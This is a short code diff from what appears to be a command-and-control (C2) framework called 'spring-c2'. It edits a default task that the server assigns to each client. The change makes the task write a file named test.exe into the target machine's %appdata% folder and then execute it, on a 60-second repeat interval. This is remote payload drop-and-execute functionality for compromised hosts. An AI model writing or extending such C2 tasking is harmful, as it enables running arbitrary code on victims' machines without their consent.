@@ -43,7 +43,8 @@ def load_default_tasks(client_id):
         repeat_interval=60,
         run_once=False,
         next_execution=datetime.utcnow() + timedelta(seconds=30),
-        target_path = r"%appdata%/spring-c2/spring-c2-downloads/test" # Location to write the file on the target machine
+        target_path = r"%appdata%/spring-c2/spring-c2-downloads/test.exe", # Location to write the file on the target machine
+        execute=True
     )
     db.session.add(dummy_task)
     
